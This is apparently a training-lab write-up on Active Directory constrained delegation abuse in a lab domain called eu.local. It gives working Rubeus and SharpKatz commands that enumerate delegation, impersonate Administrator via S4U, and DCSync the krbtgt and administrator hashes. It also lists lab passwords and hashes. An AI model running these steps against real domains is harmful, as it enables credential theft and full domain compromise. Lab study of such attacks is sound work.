# Hands-on 23: Cross Domain Attacks - Constrained Delegation

- [Hands-on 23: Cross Domain Attacks - Constrained Delegation](#hands-on-23-cross-domain-attacks---constrained-delegation)
  - [Task](#task)
  - [Enumerate users in the eu.local domain for whom Constrained Delegation is enabled](#enumerate-users-in-the-eulocal-domain-for-whom-constrained-delegation-is-enabled)
  - [Abuse the Delegation to execute DCSync attack against eu.local](#abuse-the-delegation-to-execute-dcsync-attack-against-eulocal)

---

## Task

- Enumerate users in the eu.local domain for whom Constrained Delegation is enabled.
- Abuse the Delegation to execute DCSync attack against eu.local.

<br/>

---

## Enumerate users in the eu.local domain for whom Constrained Delegation is enabled

Import AD Module:

```
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll; Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

Enumerate users in `eu.local` with Constrained Delegation (`msDS-AllowedToDelegatedTo` != `null`):

```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server eu.local
```

![picture 1](images/7cae8e5f9b95f6f1f86c6dba782bd07f0b78bbe4f5a398b0d3d7420d338b01b5.png)  

- `eu\storagesvc` has constrained delegation

<br/>

---

## Abuse the Delegation to execute DCSync attack against eu.local

In [Hands-on 22: Cross Forest Kerberoasting](l22-CrossForestKerberoast.md), we found that password of `storagesvc` to be `Qwerty@123`.

We can use **Rubeus.exe** to request an alternative ticket:

```
C:\AD\Tools\Rubeus.exe hash /password:Qwerty@123 /user:storagesvc /domain:eu.local
```

![picture 2](images/ce3c827a48534fd6f3659082c25162ab7c289057b0dfe8450db6706c093caf37.png)  

```
C:\AD\Tools\Rubeus.exe s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:eu.local /msdsspn:nmagent/eu-dc.eu.local /altservice:ldap /dc:eu-dc.eu.local /ptt
```

![picture 3](images/d1766cabf48ad17fe6ee5583b97d6a5cfdf0d2a81f0492147ef1135c03599443.png)  

![picture 4](images/d67168201c2cb51075f32f1e34e7bc97f0b200354b8c4414e4465b9e463784f3.png)  


<br/>

Then abuse the injected ticket to perform a DCSync:

```
C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\krbtgt --Domain eu.local --DomainController eu-dc.eu.local
```

![picture 5](images/f95ce692ae71f9a44f32de4d9b00ab74fa69af93b81926305f8f9120a4c4b7a5.png)  

Note:
eu\krbtgt
- SID: `S-1-5-21-3657428294-2017276338-1274645009-502`
- AES256: `b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d`
- NTLM: `83ac1bab3e98ce6ed70c9d5841341538`

<br/>

```
C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\administrator --Domain eu.local --DomainController eu-dc.eu.local
```

![picture 6](images/3b9407b7bf2652cd7007ec0005e203671fec14f7af0aa189e02a2f024bf3c116.png)  

Note:
eu\administrator
- SID: `S-1-5-21-3657428294-2017276338-1274645009-500`
- AES256: `4e7ba210b76d807429e7ad8b210e103528dcf5db8b9de6b411bf593269955a6d`
- NTLM: `fe422f818eb7e9c6de5862d94739c2e4`